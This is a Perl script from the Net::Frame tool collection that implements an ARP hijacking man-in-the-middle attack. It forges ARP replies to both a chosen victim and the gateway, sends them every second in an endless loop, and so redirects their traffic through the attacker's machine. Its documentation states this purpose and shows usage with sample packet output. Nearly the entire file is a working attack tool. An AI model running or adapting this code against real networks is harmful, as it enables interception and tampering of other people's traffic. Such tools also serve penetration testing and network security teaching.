#!/usr/bin/perl
#
# $Id: nf-arphijack.pl 349 2015-01-23 06:44:44Z gomor $
#
use strict;
use warnings;

our $VERSION = '1.00';

use Getopt::Std;
my %opts;
getopts('g:v:G:V:', \%opts);

my $oWrite;

die("Usage: $0\n".
    "\n".
    "   -g  gateway IP address\n".
    "   -G  gateway MAC address\n".
    "   -v  target victim IP address\n".
    "   -V  target victim MAC address\n".
    "") unless $opts{g} && $opts{v};

use Net::Frame::Layer::ETH qw(:consts);
use Net::Frame::Layer::ARP qw(:consts);
use Net::Frame::Simple;
use Net::Frame::Device;
use Net::Write::Layer2;

my $oDevice = Net::Frame::Device->new(target => $opts{v});

my $macGateway = $opts{G} || $oDevice->lookupMac($opts{g})
   || die("Cannot lookup gateway MAC\n");
my $macVictim  = $opts{V} || $oDevice->lookupMac($opts{v})
   || die("Cannot lookup victim MAC\n");
my $ipGateway  = $opts{g};
my $ipVictim   = $opts{v};

my $macMy = $oDevice->mac;

print "Gateway: IP=$ipGateway - MAC=$macGateway\n";
print "Victim : IP=$ipVictim - MAC=$macVictim\n";

# Gateway tells victim
my $eth1 = Net::Frame::Layer::ETH->new(
   type => NF_ETH_TYPE_ARP,
   src  => $macMy,
   dst  => $macVictim,
);
my $arp1 = Net::Frame::Layer::ARP->new(
   opCode => NF_ARP_OPCODE_REPLY,
   srcIp => $ipGateway,
   dstIp => $ipVictim,
   src   => $macMy,
   dst   => $macVictim,
);
my $replyToVictim = Net::Frame::Simple->new(
   layers => [ $eth1, $arp1 ],
);
print $replyToVictim->print."\n";

# Victim tells gateway
my $eth2 = Net::Frame::Layer::ETH->new(
   type => NF_ETH_TYPE_ARP,
   src  => $macMy,
   dst  => $macGateway,
);
my $arp2 = Net::Frame::Layer::ARP->new(
   opCode => NF_ARP_OPCODE_REPLY,
   srcIp => $ipVictim,
   dstIp => $ipGateway,
   src   => $macMy,
   dst   => $macGateway,
);
my $replyToGateway = Net::Frame::Simple->new(
   layers => [ $eth2, $arp2, ],
);
print $replyToGateway->print."\n";

$oWrite = Net::Write::Layer2->new(dev => $oDevice->dev);
$oWrite->open;

while (1) {
   $oWrite->send($replyToVictim->raw);
   $oWrite->send($replyToGateway->raw);
   print STDERR ".";
   sleep(1);
}

END {
   $oWrite && $oWrite->close;
}

__END__

=head1 NAME

nf-arphijack - Net::Frame ARP Hi-Jack tool

=head1 SYNOPSIS

   # nf-arphijack.pl -g 192.168.0.1 -v 192.168.0.69
   Gateway: IP=192.168.0.1 - MAC=00:0c:29:aa:bb:cc
   Victim : IP=192.168.0.69 - MAC=00:13:d4:aa:bb:cc
   ETH: dst:00:13:d4:aa:bb:cc  src:00:13:a9:aa:bb:cc  type:0x0806
   ARP: hType:0x0001  pType:0x0800  hSize:0x06  pSize:0x04  opCode:0x0002
   ARP: src:00:13:a9:aa:bb:cc  srcIp:192.168.0.1
   ARP: dst:00:13:d4:aa:bb:cc  dstIp:192.168.0.69
   ETH: dst:00:0c:29:aa:bb:cc  src:00:13:a9:aa:bb:cc  type:0x0806
   ARP: hType:0x0001  pType:0x0800  hSize:0x06  pSize:0x04  opCode:0x0002
   ARP: src:00:13:a9:aa:bb:cc  srcIp:192.168.0.69
   ARP: dst:00:0c:29:aa:bb:cc  dstIp:192.168.0.1
   ..

=head1 DESCRIPTION

This tool implements an ARP man-in-the-middle attack, by poisoning the ARP cache table of a gateway (or other IP address on same subnet) and a victim IP address.

The traffic will then be redirected to attacker's IP address, in both directions. So, be sure to enable router capability on your system.

=head1 AUTHOR

Patrice E<lt>GomoRE<gt> Auffret

=head1 COPYRIGHT AND LICENSE

Copyright (c) 2006-2015, Patrice E<lt>GomoRE<gt> Auffret

You may distribute this module under the terms of the Artistic license.
See LICENSE.Artistic file in the source distribution archive.

=cut
